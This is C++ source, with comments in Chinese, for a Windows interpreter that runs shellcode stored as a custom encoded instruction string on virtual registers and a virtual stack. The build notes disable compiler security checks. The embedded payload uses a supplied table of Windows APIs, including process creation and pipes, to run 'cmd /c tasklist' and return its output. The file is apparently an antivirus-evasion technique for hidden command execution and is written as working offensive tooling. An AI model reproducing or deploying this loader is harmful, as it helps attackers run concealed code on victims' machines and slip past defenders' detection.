#include <iostream>
#include <windows.h>

#include "FuncType.h"
#include "Instruction.h"

/*
* ⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
* 1.Release
* 2.C/C++
* 常规: SDL检查(否)
* 优化: 优化(已禁用)
* 代码生成: 运行库(多线程)、安全检查(禁用安全检查)
* 3.链接器
* 清单文件: 生成清单(否)
* 调试: 生成调试信息(否)
*/

using namespace std;

#pragma code_seg(".shell")

// 计算 (未考虑“*”)
DWORD_PTR calculate(DWORD_PTR number1, DWORD_PTR number2, char symbol) {
    switch (symbol)
    {
    case '+':
        return number1 + number2;
    case '-':
        return number1 - number2;
    }
}

// 解析算式 (未考虑“*”)
void ParseFormula(char* op, char** pFormula, char** symbols, PVOID* pFuncAddr) {
    int n = 1;
    int opLength = ((pStrlen)pFuncAddr[3])(op);
    for (int i = 0; i < opLength; i++) {
        switch (op[i])
        {
        case '+':
            pFormula[n] = symbols[0];
            *(op + i) = '\0';
            n += 2;
            break;
        case '-':
            pFormula[n] = symbols[1];
            *(op + i) = '\0';
            n += 2;
            break;
        }
    }
    n = 0;
    for (int i = 0; i < opLength; i += ((pStrlen)pFuncAddr[3])(op + i) + 1) {
        pFormula[n] = op + i;
        n += 2;
    }
}

// 获取操作数值的 类型(r寄存器/m内存空间) + 地址
DWORD_PTR GetOpTypeAndAddr(char* op, char* pOpType1, PDWORD_PTR pVtRegs, PDWORD_PTR opNumber, PVOID* pFuncAddr) {
    char* endPtr;
    char tempOp[50] = "";
    char* symbols[] = { (char*)"+", (char*)"-" };
    char* formula[] = { NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL };

    // 立即数
    if (op[0] == 'i') {
        *opNumber = ((pStrtol)pFuncAddr[4])(op + 1, &endPtr, 16);
        return (DWORD_PTR)opNumber;
    }
    // lea [] / ptr []
    else if (op[0] == 'l' || op[0] == 'p') {
        // 拷贝操作数 (解析算式过程会导致变化)
        ((pStrcpy_s)pFuncAddr[5])(tempOp, sizeof(tempOp), op);
        // 解析算式 (未考虑“*”)
        ParseFormula(op + 1, formula, symbols, pFuncAddr);
        // 计算 (未考虑“*”)
        DWORD_PTR number1 = 0;
        DWORD_PTR number2;
        char symbol = '+';
        for (int i = 0; formula[i] != NULL; i++) {
            switch (formula[i][0])
            {
            case 'i':
                DWORD_PTR tempNumber; // 存储数字
                GetOpTypeAndAddr(formula[i], NULL, pVtRegs, &tempNumber, pFuncAddr);
                number1 = calculate(number1, tempNumber, symbol);
                break;
            case 'q':
                number2 = *(PDWORD64)GetOpTypeAndAddr(formula[i], NULL, pVtRegs, NULL, pFuncAddr);
                number1 = calculate(number1, number2, symbol);
                break;
            case 'd':
                number2 = *(PDWORD)GetOpTypeAndAddr(formula[i], NULL, pVtRegs, NULL, pFuncAddr);
                number1 = calculate(number1, number2, symbol);
                break;
            case 'w':
                number2 = *(PWORD)GetOpTypeAndAddr(formula[i], NULL, pVtRegs, NULL, pFuncAddr);
                number1 = calculate(number1, number2, symbol);
                break;
            case 'b':
                number2 = *(PBYTE)GetOpTypeAndAddr(formula[i], NULL, pVtRegs, NULL, pFuncAddr);
                number1 = calculate(number1, number2, symbol);
                break;
            case '+':
                symbol = '+';
                break;
            case '-':
                symbol = '-';
                break;
            }
        }
        // 还原操作数
        ((pStrcpy_s)pFuncAddr[5])(op, sizeof(tempOp), tempOp);
        // lea []
        if (op[0] == 'l') {
            *opNumber = number1;
            return (DWORD_PTR)opNumber;
        }
        // ptr []
        if (pOpType1 != NULL) {
            *pOpType1 = 'm';
        }
        return number1;
    }
    // 寄存器
    else {
        if (pOpType1 != NULL) {
            *pOpType1 = 'r';
        }
        return (DWORD_PTR)pVtRegs + ((pStrtol)pFuncAddr[4])(op + 1, &endPtr, 16);
    }
}

// 解析自定义汇编
void ParseSelfAsm(char* selfAsm, PDWORD_PTR pVtRegs, PVOID* pFuncAddr) {
    // 逐条解析
    int i = 0;
    int num = 0;
    char* endPtr;
    int* vtAddrMapping = (int*)((pMalloc)pFuncAddr[0])(1000 * sizeof(int*)); // num -> 虚拟地址
    int* numMapping = (int*)((pMalloc)pFuncAddr[0])(3000 * sizeof(int*)); // 虚拟地址 -> num
    int* mnemonicIndexMapping = (int*)((pMalloc)pFuncAddr[0])(1000 * sizeof(int*)); // num -> mnemonicIndex
    char** opBit1Mapping = (char**)((pMalloc)pFuncAddr[0])(1000 * sizeof(char*)); // num -> opBit1
    char** op1Mapping = (char**)((pMalloc)pFuncAddr[0])(1000 * sizeof(char*)); // num -> op1
    char** opBit2Mapping = (char**)((pMalloc)pFuncAddr[0])(1000 * sizeof(char*)); // num -> opBit2
    char** op2Mapping = (char**)((pMalloc)pFuncAddr[0])(1000 * sizeof(char*)); // num -> op2
    while (selfAsm[i] != '!') {
        // 虚拟地址
        DWORD_PTR vtAddr = ((pStrtol)pFuncAddr[4])(selfAsm + i, &endPtr, 16);
        i += ((pStrlen)pFuncAddr[3])(selfAsm + i) + 1;
        vtAddrMapping[num] = vtAddr;
        numMapping[vtAddr] = num;

        // 助记符序号
        mnemonicIndexMapping[num] = ((pStrtol)pFuncAddr[4])(selfAsm + i, &endPtr, 10);
        i += ((pStrlen)pFuncAddr[3])(selfAsm + i) + 1;

        // 操作数1 位数
        opBit1Mapping[num] = selfAsm + i;
        i += ((pStrlen)pFuncAddr[3])(selfAsm + i) + 1;

        // 操作数1
        op1Mapping[num] = selfAsm + i;
        i += ((pStrlen)pFuncAddr[3])(selfAsm + i) + 1;

        // 操作数2 位数
        opBit2Mapping[num] = selfAsm + i;
        i += ((pStrlen)pFuncAddr[3])(selfAsm + i) + 1;

        // 操作数1
        op2Mapping[num] = selfAsm + i;
        i += ((pStrlen)pFuncAddr[3])(selfAsm + i) + 1;

        num++;
    }

    // 逐条执行
    for (int i = 0; i < num; i++) {
        pVtRegs[16] = vtAddrMapping[i];
        int mnemonicIndex = mnemonicIndexMapping[i];
        char* opBit1 = opBit1Mapping[i];
        char* op1 = op1Mapping[i];
        char* opBit2 = opBit2Mapping[i];
        char* op2 = op2Mapping[i];

        // 获取两个操作数的 类型(r寄存器/m内存空间) + 地址
        char opType1;
        DWORD_PTR opAddr1 = NULL;
        DWORD_PTR opAddr2 = NULL;
        DWORD_PTR opNumber; // 存储数字
        if (((pStrlen)pFuncAddr[3])(op1)) {
            opAddr1 = GetOpTypeAndAddr(op1, &opType1, pVtRegs, &opNumber, pFuncAddr);
        }
        if (((pStrlen)pFuncAddr[3])(op2)) {
            opAddr2 = GetOpTypeAndAddr(op2, NULL, pVtRegs, &opNumber, pFuncAddr);
        }

        // 调用指令
        if (InvokeInstruction(mnemonicIndex, opType1, opBit1[0], opAddr1, opBit2[0], opAddr2, pVtRegs)) {
            i = numMapping[pVtRegs[16]]; // Jcc 指令跳转
            i--;
        }
    }

    ((pFree)pFuncAddr[2])(vtAddrMapping);
    ((pFree)pFuncAddr[2])(numMapping);
    ((pFree)pFuncAddr[2])(mnemonicIndexMapping);
    ((pFree)pFuncAddr[2])(opBit1Mapping);
    ((pFree)pFuncAddr[2])(op1Mapping);
    ((pFree)pFuncAddr[2])(opBit2Mapping);
    ((pFree)pFuncAddr[2])(op2Mapping);
}

#pragma code_seg(".magic")

// 魔法调用
void MagicInvoke(char* selfAsm, char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* pFuncAddr) {
    // 创建虚拟栈
    PVOID vtStack = ((pMalloc)pFuncAddr[0])(0x10000);

    // 创建虚拟寄存器
    /*
    * 0  RAX
    * 1  RBX
    * 2  RCX
    * 3  RDX
    * 4  RSI
    * 5  RDI
    * 6  R8
    * 7  R9
    * 8  R10
    * 9  R11
    * 10 R12
    * 11 R13
    * 12 R14
    * 13 R15
    * 14 RSP
    * 15 RBP
    * 16 RIP
    * 17 EFL
    */
    DWORD_PTR vtRegs[18] = { 0 };
    vtRegs[14] = vtRegs[15] = (DWORD_PTR)vtStack + 0x9000;

    // 设置虚拟寄存器的初值
    /*
    * ShellCode(commandPara, commandParaLength, &outputData, &outputDataLength, funcAddr);
    * lea rax, [funcAddr]
    * mov qword ptr [rsp+20h], rax
    * lea r9, [outputDataLength]
    * lea r8, [outputData]
    * mov edx, dword ptr [commandParaLength]
    * lea rcx, [commandPara]
    * call ShellCode
    */
    vtRegs[0] = (DWORD_PTR)pFuncAddr;
    *(PDWORD_PTR)(vtRegs[14] + 0x20) = vtRegs[0];
    vtRegs[7] = (DWORD_PTR)pOutputDataLength;
    vtRegs[6] = (DWORD_PTR)pOutputData;
    vtRegs[3] = commandParaLength;
    vtRegs[2] = (DWORD_PTR)commandPara;
    vtRegs[14] = vtRegs[14] - sizeof(DWORD_PTR);

    // 解析自定义汇编
    ParseSelfAsm(selfAsm, vtRegs, pFuncAddr);
    ((pFree)pFuncAddr[2])(vtStack);
}

#pragma code_seg(".text")

int main() {
    // 自定义汇编
    char selfAsm[] = "0\0""4\0""q\0""pq70+i20\0""q\0""q38\0""5\0""4\0""q\0""pq70+i18\0""q\0""q30\0""a\0""4\0""d\0""pq70+i10\0""d\0""d18\0""e\0""4\0""q\0""pq70+i8\0""q\0""q10\0""13\0""0\0""q\0""q28\0""q\0""\0""14\0""11\0""q\0""q70\0""q\0""i120\0""1b\0""4\0""d\0""d0\0""d\0""i8\0""20\0""13\0""q\0""q0\0""q\0""i0\0""24\0""4\0""d\0""d10\0""d\0""i64\0""29\0""4\0""q\0""q18\0""q\0""pq70+i150\0""31\0""2\0""q\0""pq18+q0\0""q\0""\0""34\0""4\0""q\0""q10\0""q\0""pq70+i140\0""3c\0""4\0""q\0""pq10\0""q\0""q0\0""3f\0""4\0""q\0""q0\0""q\0""pq70+i140\0""47\0""4\0""q\0""q0\0""q\0""pq0\0""4a\0""4\0""b\0""pq0\0""b\0""i30\0""4d\0""4\0""q\0""q0\0""q\0""pq70+i148\0""55\0""4\0""d\0""pq0\0""d\0""i1\0""5b\0""4\0""d\0""pq70+i78\0""d\0""i18\0""63\0""4\0""d\0""pq70+i88\0""d\0""i1\0""6e\0""4\0""q\0""pq70+i80\0""q\0""i0\0""7a\0""4\0""d\0""d0\0""d\0""i8\0""7f\0""13\0""q\0""q0\0""q\0""i9\0""83\0""16\0""d\0""d38\0""d\0""d38\0""86\0""8\0""q\0""q30\0""q\0""lq70+i78\0""8b\0""8\0""q\0""q18\0""q\0""lq70+i58\0""90\0""8\0""q\0""q10\0""q\0""lq70+i60\0""95\0""4\0""q\0""q40\0""q\0""pq70+i150\0""9d\0""2\0""q\0""pq40+q0\0""q\0""\0""a1\0""17\0""d\0""d0\0""d\0""d0\0""a3\0""23\0""q\0""iaa\0""q\0""\0""a5\0""21\0""q\0""i2c9\0""q\0""\0""aa\0""8\0""q\0""q0\0""q\0""lq70+ib0\0""b2\0""4\0""q\0""q28\0""q\0""q0\0""b5\0""16\0""d\0""d0\0""d\0""d0\0""b7\0""4\0""d\0""d10\0""d\0""i68\0""bc\0""20\0""b\0""pq28\0""b\0""b0\0""be\0""4\0""d\0""pq70+ib0\0""d\0""i68\0""c9\0""4\0""q\0""q0\0""q\0""pq70+i58\0""ce\0""4\0""q\0""pq70+i110\0""q\0""q0\0""d6\0""4\0""q\0""q0\0""q\0""pq70+i58\0""db\0""4\0""q\0""pq70+i108\0""q\0""q0\0""e3\0""16\0""d\0""d0\0""d\0""d0\0""e5\0""4\0""w\0""pq70+if0\0""w\0""w0\0""ed\0""4\0""d\0""pq70+iec\0""d\0""i101\0""f8\0""4\0""d\0""d0\0""d\0""i8\0""fd\0""13\0""q\0""q0\0""q\0""i8\0""101\0""8\0""q\0""q10\0""q\0""lq70+i90\0""109\0""4\0""q\0""pq70+i48\0""q\0""q10\0""10e\0""8\0""q\0""q10\0""q\0""lq70+ib0\0""116\0""4\0""q\0""pq70+i40\0""q\0""q10\0""11b\0""4\0""q\0""pq70+i38\0""q\0""i0\0""124\0""4\0""q\0""pq70+i30\0""q\0""i0\0""12d\0""4\0""d\0""pq70+i28\0""d\0""i0\0""135\0""4\0""d\0""pq70+i20\0""d\0""i1\0""13d\0""16\0""d\0""d38\0""d\0""d38\0""140\0""16\0""d\0""d30\0""d\0""d30\0""143\0""4\0""q\0""q18\0""q\0""pq70+i130\0""14b\0""16\0""d\0""d10\0""d\0""d10\0""14d\0""4\0""q\0""q28\0""q\0""pq70+i150\0""155\0""2\0""q\0""pq28+q0\0""q\0""\0""158\0""17\0""d\0""d0\0""d\0""d0\0""15a\0""23\0""q\0""i193\0""q\0""\0""15c\0""4\0""d\0""d0\0""d\0""i8\0""161\0""13\0""q\0""q0\0""q\0""i7\0""165\0""4\0""q\0""q10\0""q\0""pq70+i60\0""16a\0""4\0""q\0""q18\0""q\0""pq70+i150\0""172\0""2\0""q\0""pq18+q0\0""q\0""\0""175\0""4\0""d\0""d0\0""d\0""i8\0""17a\0""13\0""q\0""q0\0""q\0""i7\0""17e\0""4\0""q\0""q10\0""q\0""pq70+i58\0""183\0""4\0""q\0""q18\0""q\0""pq70+i150\0""18b\0""2\0""q\0""pq18+q0\0""q\0""\0""18e\0""21\0""q\0""i2c9\0""q\0""\0""193\0""4\0""d\0""d0\0""d\0""i8\0""198\0""13\0""q\0""q0\0""q\0""i7\0""19c\0""4\0""q\0""q10\0""q\0""pq70+i58\0""1a1\0""4\0""q\0""q18\0""q\0""pq70+i150\0""1a9\0""2\0""q\0""pq18+q0\0""q\0""\0""1ac\0""4\0""d\0""d0\0""d\0""i8\0""1b1\0""13\0""q\0""q0\0""q\0""i7\0""1b5\0""4\0""q\0""q10\0""q\0""pq70+i98\0""1bd\0""4\0""q\0""q18\0""q\0""pq70+i150\0""1c5\0""2\0""q\0""pq18+q0\0""q\0""\0""1c8\0""4\0""d\0""d0\0""d\0""i8\0""1cd\0""13\0""q\0""q0\0""q\0""i7\0""1d1\0""4\0""q\0""q10\0""q\0""pq70+i90\0""1d9\0""4\0""q\0""q18\0""q\0""pq70+i150\0""1e1\0""2\0""q\0""pq18+q0\0""q\0""\0""1e4\0""4\0""q\0""q0\0""q\0""pq70+i148\0""1ec\0""4\0""d\0""pq0\0""d\0""i0\0""1f2\0""4\0""q\0""q0\0""q\0""pq70+i148\0""1fa\0""7\0""q\0""q0\0""d\0""pq0\0""1fd\0""4\0""q\0""q10\0""q\0""pq70+i140\0""205\0""9\0""q\0""q0\0""q\0""pq10\0""208\0""4\0""d\0""d10\0""d\0""i8\0""20d\0""13\0""q\0""q10\0""q\0""ia\0""211\0""4\0""q\0""pq70+i68\0""q\0""q10\0""216\0""4\0""q\0""pq70+i20\0""q\0""i0\0""21f\0""8\0""q\0""q38\0""q\0""lq70+i50\0""224\0""4\0""d\0""d30\0""d\0""i64\0""22a\0""4\0""q\0""q18\0""q\0""q0\0""22d\0""4\0""q\0""q10\0""q\0""pq70+i60\0""232\0""4\0""q\0""q0\0""q\0""pq70+i150\0""23a\0""4\0""q\0""q28\0""q\0""pq70+i68\0""23f\0""2\0""q\0""pq0+q28\0""q\0""\0""242\0""17\0""d\0""d0\0""d\0""d0\0""244\0""22\0""q\0""i2b0\0""q\0""\0""246\0""12\0""d\0""pq70+i50\0""d\0""i0\0""24b\0""22\0""q\0""i2b0\0""q\0""\0""24d\0""4\0""q\0""q0\0""q\0""pq70+i148\0""255\0""4\0""d\0""d0\0""d\0""pq0\0""257\0""9\0""d\0""d0\0""d\0""pq70+i50\0""25b\0""4\0""q\0""q10\0""q\0""pq70+i148\0""263\0""4\0""d\0""pq10\0""d\0""d0\0""265\0""4\0""q\0""q0\0""q\0""pq70+i148\0""26d\0""4\0""d\0""d0\0""d\0""pq0\0""26f\0""9\0""d\0""d0\0""d\0""i64\0""272\0""19\0""q\0""\0""q\0""\0""274\0""4\0""d\0""d10\0""d\0""i8\0""279\0""13\0""q\0""q10\0""q\0""i1\0""27d\0""4\0""q\0""pq70+i70\0""q\0""q10\0""282\0""4\0""q\0""q18\0""q\0""q0\0""285\0""4\0""q\0""q0\0""q\0""pq70+i140\0""28d\0""4\0""q\0""q10\0""q\0""pq0\0""290\0""4\0""q\0""q0\0""q\0""pq70+i150\0""298\0""4\0""q\0""q28\0""q\0""pq70+i70\0""29d\0""2\0""q\0""pq0+q28\0""q\0""\0""2a0\0""4\0""q\0""q10\0""q\0""pq70+i140\0""2a8\0""4\0""q\0""pq10\0""q\0""q0\0""2ab\0""21\0""q\0""i1f2\0""q\0""\0""2b0\0""4\0""d\0""d0\0""d\0""i8\0""2b5\0""13\0""q\0""q0\0""q\0""i7\0""2b9\0""4\0""q\0""q10\0""q\0""pq70+i60\0""2be\0""4\0""q\0""q18\0""q\0""pq70+i150\0""2c6\0""2\0""q\0""pq18+q0\0""q\0""\0""2c9\0""9\0""q\0""q70\0""q\0""i120\0""2d0\0""1\0""q\0""q28\0""q\0""\0""2d1\0""3\0""q\0""\0""q\0""\0""!";

    // ShellCode 参数
    char commandPara[] = "cmd /c tasklist";
    int commandParaLength = strlen(commandPara) + 1;
    char* outputData;
    int outputDataLength;
    PVOID funcAddr[] = { malloc, realloc, free, strlen, strtol, ((errno_t(*)(char*, rsize_t, const char*))strcpy_s), ((int(*)(char*, size_t, const char*, ...))sprintf_s), CloseHandle, CreateProcessA, CreatePipe, ReadFile, FindFirstFileA, FindNextFileA, FindClose, GetFullPathNameA, FileTimeToSystemTime };

    // 调用解释器
    MagicInvoke(selfAsm, commandPara, commandParaLength, &outputData, &outputDataLength, funcAddr);

    // ShellCode 输出
    *(outputData + outputDataLength) = '\0';
    cout << outputData;
}